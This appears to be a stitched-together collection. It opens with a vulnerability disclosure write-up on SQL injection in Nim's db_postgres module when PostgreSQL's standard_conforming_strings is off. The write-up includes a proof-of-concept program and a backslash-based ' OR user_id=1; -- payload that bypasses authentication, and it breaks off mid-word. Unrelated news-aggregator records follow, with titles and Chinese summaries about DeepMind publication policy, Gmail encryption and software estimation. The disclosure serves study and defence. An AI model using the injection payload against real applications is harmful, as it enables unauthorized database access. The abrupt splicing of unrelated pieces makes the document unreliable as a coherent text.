I originally discovered and disclosed this to the Nim security email in July 2023. As this edge case and quirk with this particular set-up seemed interesting, I decided to post this here.
Overview
Nim's
db_postgres
module supports executing queries using parameterization syntax to protect against SQL injection. For example:
getRow
(
sql"SELECT username FROM users WHERE username=?;"
,
"user"
)
In this case, the
?
symbol gets replaced with the supplied argument, resulting in:
SELECT
username
FROM
users
WHERE
username
=
'user'
;
This happens through the
dbFormat
procedure, defined
here
, which calls the
dbQuote
procedure for each
?
symbol with the supplied parameter, defined
here
.
The
dbQuote
procedure escapes single quotes (replacing
'
with
''
), which is correct behavior. It also attempts to escape null characters with
\\0
- but this isn't quite right. Without considering PostgreSQL's
standard_conforming_strings
setting, this can lead to unexpected behavior since backslashes don't have special meaning when
standard_conforming_strings
is enabled.
For reference, the Java PostgreSQL driver takes a more comprehensive approach. Here's what
Utils.escapeLiteral
in the official Java library
org.postgresql.core
does:
if
(
standardConformingStrings
)
{
// With standard_conforming_strings on, escape only single-quotes.
for
(
int
i
=
0
;
i
<
value
.
length
();
++
i
)
{
char
ch
=
value
.
charAt
(
i
);
if
(
ch
==
'\0'
)
throw
new
PSQLException
(
GT
.
tr
(
"Zero bytes may not occur in string parameters."
),
PSQLState
.
INVALID_PARAMETER_VALUE
);
if
(
ch
==
'\''
)
sbuf
.
append
(
'\''
);
sbuf
.
append
(
ch
);
}
}
The Java implementation considers the
standard_conforming_strings
setting and rejects null characters entirely. If this setting is disabled, it enters a different code path where many more characters are properly escaped.
It should be noted that this approach of escaping parameter values and manually inserting them into the SQL statement is not how true parameterization should work. Proper parameterization separates the SQL query from the parameter values completely, with the database driver handling the parameters as distinct entities from the query text.
The vulnerability
When
standard_conforming_strings
is set to "on" (the default since PostgreSQL 9.1), Nim's module works safely. However, on older PostgreSQL versions or when this setting is manually set to "off" (which happens more often than you might expect due to compatibility requirements), SQL injection vulnerabilities can occur because the module fails to account for other characters with special meanings.
You can find more information about this configuration option in the
PostgreSQL manual
.
Proof of concept
I'll demonstrate the vulnerability using the backslash character, which can break the syntax of a query and escape the quoted string's ending quote.
First, I set up PostgreSQL 15.3 with
standard_conforming_strings
set to "off" in the
postgresql.conf
file, and created a simple table to emulate a user account system:
test
=#
SELECT
*
from
users
;
user_id
|
username
|
password
---------+----------+--------------------------
1
|
admin
|
supersecretadminpassword
2
|
user
|
userpassword
Here's a simple vulnerable Nim program:
import
std
/[
db_postgres
,
os
]
let
db
=
db_postgres
.
open
(
"localhost"
,
"testuser"
,
"testpass"
,
"test"
)
echo
db
.
getRow
(
sql"SELECT username FROM users WHERE username=? AND password=?;"
,
paramStr
(
1
),
paramStr
(
2
))
db
.
close
()
When used with normal parameters, it works as expected:
$
./poc
'user'
'userpassword'
@["user"]
However, by introducing a backslash, we can bypass the authentication and select the admin account instead:
$
./poc
'\'
' OR user_id=1; --'
@["admin"]
The generated SQL query becomes:
SELECT
username
FROM
users
WHERE
username
=
'\'
AND
password
=
' OR user_id=1; --'
;
If the PostgreSQL configuration option
escape_string_warning
is enabled, you'll see a warning in the logs:
WARNING:  nonstandard use of \' in a string literal at character 43
HINT:  Use '' to write quotes in strings, or use the escape string syntax (E'...').
However, in production environments, I've observed many cases where this configuration is still set to "off" or the warnings are simply ignored.
It's worth noting that the vulnerability is also present when using PostgreSQL's
E
syntax, which allows developers to selectively disable standard conforming strings in any part of a query, even if the global
standard_conforming_strings
setting is enabled.
Impact
Applications using Nim's
db_postgres
module with PostgreSQL databases where
standard_conforming_strings
is disabled may be vulnerable to SQL injection attacks. This could lead to unauthorized data access, authentication bypass, or potentially ot

data.title: DeepMind is holding back release of AI research to give Google an edge
data.author: jonbaer
data.article_summary: Google旗下的DeepMind为了在AI行业竞争中保持优势，加强了对研究论文发布的管控。过去以发布突破性论文闻名的DeepMind，现在引入更严格的审核流程，尤其是涉及生成式AI的战略性论文，发布前有六个月的 embargo 期。三位前研究员透露，公司不愿分享可能被竞争对手利用的创新，或可能影响其Gemini AI模型声誉的研究。这一变化导致部分研究人员不满，有人甚至因此离职，认为这与DeepMind最初注重科研成果公开的理念相悖。尽管DeepMind声称仍致力于推动AI研究，并每年发表数百篇论文，但内部更加重视产品开发而非学术公开。
data.comments_summary:
主要讨论点：企业与学术机构在研究中的角色及其动机差异

不同观点：
• [malcolmgreaves] 认为企业进行研究的主要目的是为了盈利，并以专利事件为例，指出企业会采取各种手段来保护和扩大其经济利益。他还认为，企业发表的研究成果往往带有市场宣传性质，可能存在夸大或歪曲事实的情况。他强调，企业研究不如学术和非营利机构的研究可信，因为后者更可能保持中立并追求真正的科学进步。此外，他批评了某些政治行为对学术研究经费的负面影响，认为这是对科研前沿的重大打击。

Google’s artificial intelligence arm DeepMind has been holding back the release of its world-renowned research, as it seeks to retain a competitive edge in the race to dominate the burgeoning AI industry.
The group, led by Nobel Prize-winner Sir Demis Hassabis, has introduced a tougher vetting process and more bureaucracy that made it harder to publish studies about its work on AI, according to seven current and former research scientists at Google DeepMind.
Three former researchers said the group was most reluctant to share papers that reveal innovations that could be exploited by competitors, or cast Google’s own Gemini AI model in a negative light compared with others.
The changes represent a significant shift for DeepMind, which has long prided itself on its reputation for releasing groundbreaking papers and as a home for the best scientists building AI.
Meanwhile, huge breakthroughs by Google researchers—such as its 2017 “transformers” paper that provided the architecture behind large language models—played a central role in creating today’s boom in generative AI.
Since then, DeepMind has become a central part of its parent company’s drive to cash in on the cutting-edge technology, as investors expressed concern that the Big Tech group had ceded its early lead to the likes of ChatGPT maker OpenAI.
“I cannot imagine us putting out the transformer papers for general use now,” said one current researcher.
Among the changes in the company’s publication policies is a six-month embargo before “strategic” papers related to generative AI are released. Researchers also often need to convince several staff members of the merits of publication, said two people with knowledge of the matter.
A person close to DeepMind said the changes were to benefit researchers who had become frustrated spending time on work that would not be approved for strategic or competitive reasons. They added that the company still publishes hundreds of papers each year and is among the largest contributors to major AI conferences.
Concern that Google was falling behind in the AI race contributed to the merger of London-based DeepMind and California-based Brain AI units in 2023. Since then, it has been faster to roll out a wide array of AI-infused products.
“The company has shifted to one that cares more about product and less about getting research results out for the general public good,” said one former DeepMind research scientist. “It’s not what I signed up for.”
DeepMind said it had “always been committed to advancing AI research and we are instituting updates to our policies that preserve the ability for our teams to publish and contribute to the broader research ecosystem.”
While the company had a publication review process in place before DeepMind’s merger with Brain, the system has become more bureaucratic, according to those with knowledge of the changes.
Former staffers suggested the new processes had stifled the release of commercially sensitive research to avoid the leaking of potential innovations. One said publishing papers on generative AI was “almost impossible.”
In one incident, DeepMind stopped the publication of research that showed Google’s Gemini language model is not as capable or is less safe than rivals, especially OpenAI’s GPT-4, according to one current employee.
However, the employee added it had also blocked a paper that revealed vulnerabilities in OpenAI’s ChatGPT, over concerns the release seemed like a hostile tit-for-tat.
A person close to DeepMind said it did not block papers that discuss security vulnerabilities, adding that it routinely publishes such work under a “responsible disclosure policy,” in which researchers must give companies the chance to fix any flaws before making them public.
But the clampdown has unsettled some staffers, where success has long been measured through appearing in top-tier scientific journals. People with knowledge of the matter said the new review processes had contributed to some departures.
“If you can’t publish, it’s a career killer if you’re a researcher,” said a former researcher.
Some ex-staff added that projects focused on improving its Gemini suite of AI-infused products were increasingly prioritized in the internal battle for access to data sets and computing power.
In the past few years, Google has produced a range of AI-powered products that have impressed the markets. This includes improving its AI-generated summaries that appear above search results, to unveiling an “Astra” AI agent that can answer real-time queries across video, audio, and text.
The company’s share price has increased by as much as a third over the past year, though those gains pared back in recent weeks as concern over US tariffs hit tech stocks.

data.title: Gmail Users Can Send Encrypted Email to Anyone
data.author: taubek
data.article_summary: Gmail has introduced end-to-end encryption (E2EE) on its 21st anniversary, addressing long-standing security concerns. With 2.5 billion users, Gmail has been a prime target for cyberattacks, prompting Google to develop a new encryption method. This innovation eliminates complex certificate requirements and allows users to send encrypted emails to any email platform. Initially, the feature will be available for enterprise users to send E2EE emails within their organization, with plans to extend it to all Gmail users and other email platforms in the future. The encryption uses customer-controlled keys, enhancing privacy by ensuring even Google servers cannot access the content. Non-Gmail recipients will view emails via a restricted Gmail interface. This development marks a significant advancement in Gmail's security framework.

Gmail gets EE2E as it turns 21.
SOPA Images/LightRocket via Getty Images
The greatest April Fool’s Day joke that never was has to have taken place on April 1, 2004. It was then that Google, without a hint of irony, launched what was to become the world’s most popular email platform, Gmail, to an unsuspecting public. Fast-forward 21 years, and according to Google itself, Gmail has an astonishing 2.5 billion active users. One thing it hasn’t had, however, is end-to-end encryption — until now. Not everyone will be able to benefit from this, but as birthday announcements go, this one is a doozy: Google said it has “invented an entirely new type of encryption.” Here’s what you need to know.
Forbes
200 Million X User Records Released — 2.8 Billion Twitter IDs Leaked
By
Davey Winder
Google Claims To Have Invented An Entirely New Type Of Encryption For Gmail Users
Gmail is, largely because of that enormous user footprint, a hacker magnet. Whether we are talking
ransomware attacks with Gmail
in the mix, or highly
sophisticated phishing threats
, there’s no doubt that
Gmail threats are surging
. Security and privacy rub up against each other often, and nowhere more so than when talking about encryption. Especially status quo encryption.
When it comes to whatever you want, however, status quo encryption is unlikely to fit the bill. OK, so it has nothing to do with the legendary British rock band and everything to do with the current state of encryption technology and practice as far as security and data protection are concerned. Despite encryption being a regulatory must-have for many an enterprise, “status quo encryption is too hard to achieve and has important gaps that limit its effectiveness,” Google said. While attempts at end-to-end encryption work well in certain narrowly defined circumstances, there are huge obstacles to overcome in terms of complexity and cost for most email users. Which is why, Google spokesperson Ross Richendrfer told me, it decided to invent an entirely new type of Gmail encryption to solve those problems.

New Data-Theft Warning — By Order Of The Peaky Blinders
By
Davey Winder

Google Brings E2EE Bubble To Enterprise Gmail Users
Johney Burke, a senior product manager, Julien Duplant, a product manager, both with Google Workplace, have
confirmed
that the organization wanted to do something special on Gmail’s 21st birthday, namely to “enable enterprise users to send E2EE messages to any user on any email inbox with just a few clicks.”
“We’re rolling this out in a phased approach, starting today, in beta, with the ability to send E2EE emails to Gmail users in your own organization,” Google said. “In the coming weeks, users will be able to send E2EE emails to any Gmail inbox, and, later this year, to any email inbox.”
Sending an E2EE email to a non-Gmail user.
Google
The encryption model claims to entirely remove any need for complex certificate requirements or administration, and enable the sending of fully encrypted messages to any user on any email platform with no overhead on either side. “Imagine a protective bubble encasing your email,” Google said, “it travels wherever your email goes and works regardless of the recipient’s encryption status.” In other words, you own the bubble, so you can let those you trust into the bubble. They can interact with your emails while inside, but when they leave, they also leave that data behind.
Securely viewing an E2EE email in the restricted version of Gmail.
Google
“The emails are protected using encryption keys controlled by the customer and not available to Google servers,” Burke and Duplant said, “providing enhanced data privacy and security.” If the recipient is a Gmail user, then Gmail will send the E2EE encrypted email which is then automatically decrypted in the recipient’s inbox. If the recipient isn’t a Gmail user, then they get an invite to view within a restricted version of Gmail as a Google Workspace guest account to interact with the email.

data.title: All estimations are wrong, but none are useful
data.author: Kerrick
data.article_summary:
文章主要讨论了软件开发中估算的不可靠性及其常见原因，如Hofstadter’s Law、Brook’s Law、Planning Fallacy、Bikeshedding、Parkinson’s Law和Ninety-Ninety Rule。估算本质上是预测，而预测未来充满不确定性，尤其在复杂软件项目中。文章还提到"不确定性锥"（Cone of Uncertainty）概念，虽然其数据基础受到质疑。

为改善估算准确性，文章建议：
1. 创建反馈循环（如使用燃尽图）。
2. 接受估算错误，并加入缓冲时间。
3. 预留应对意外的空间。
4. 使用测试自动化等方法衡量项目进度。
5. 应用COCOMO模型进行估算。

其他建议包括：任务分解、保守估算、考虑类似经验以及定期更新估算。开发团队应承认估算的局限性，同时通过持续改进和沟通提升估算质量。
data.comments_summary:
主要讨论点：软件项目估算的准确性、估算的价值以及估算困难的原因

不同观点：
• **管理层干预导致估算失准**：variaga指出，最初的估算通常是准确的，但由于管理层希望缩短工期，估算会被不断压缩，导致最终估算脱离实际。这种情况下，估算不准是因为管理层不愿意接受较长的工期。

• **软件估算缺乏文化和培训**：brudgers认为，软件估算不准是因为缺乏像建筑行业那样成熟的估算文化、正式的培训和激励机制。建筑项目由于有专门的估算人员和严格的成本控制，通常能得到较为准确的估算。

• **风险和未知因素影响估算**：mattferderer强调，在进行估算时，识别和沟通风险和未知因素至关重要。通过颜色标识（红、黄、绿）或工具如Basecamp的Hill Charts，可以有效管理项目风险，提高估算的可靠性。

• **初期进展快，后期细节工作拖慢进度**：didgetmaster将软件开发与建房类比，指出初期进展可能较快，但随着细节工作（如错误处理、性能优化等）的展开，进度会明显放缓，导致估算失准。

• **销售与开发之间的时间估算矛盾**：donatj分享了自己的经验，指出销售人员倾向于选择较短的估算时间以促成销售，导致开发人员在执行时面临不切实际的期望。这种矛盾会导致开发团队内部的不满。

• **只能估算曾经做过的工作**：hkpack认为，软件工程中的估算只能基于过去做过的工作，对于研发和创新性项目，估算基本上是猜测，因为这些项目具有不确定性和复杂性。

• **需求明确时估算才有意义**：myrmidon指出，只有在需求、接口和任务明确时才能给出可靠的估算，但通常人们在项目早期就需要估算，这时估算的准确性较低。

• **估算过程的价值**：hakaneskici认为，估算的价值在于规划活动本身，而不是最终的文件。通过规划，团队可以更好地理解项目需求和任务。

• **估算的复杂性和不可控因素**：gilbetron指出，软件估算的困难在于每个模块或功能的开发都是新的，且隐藏的复杂性和简化因素无处不在。此外，遗留代码库的估算更加困难。

• **外部因素影响估算**：teeray提到，代码审查、CI/CD管道问题等外部因素也会影响估算的准确性，导致估算变得不可靠。

补充讨论：
• **对霍夫斯塔特法则的误解**：j_maffe指出，霍夫斯塔特法则常被误用于时间估算，但实际上它只是一个递归定义的例子，不应被过度解读。

• **估算的价值质疑**：amelius和gedy质疑估算的实际价值，指出尽管估算常常不准确，但管理层仍然要求提供。gedy进一步建议采用Kanban风格的优先级管理和限制在制品数量的方法，以避免不必要的估算。

通过这些观点，可以看到软件估算的复杂性和多方面因素的影响，包括管理层的期望、风险管理、项目特性以及外部因素等。估算的价值和方法也在不断被讨论和质疑。
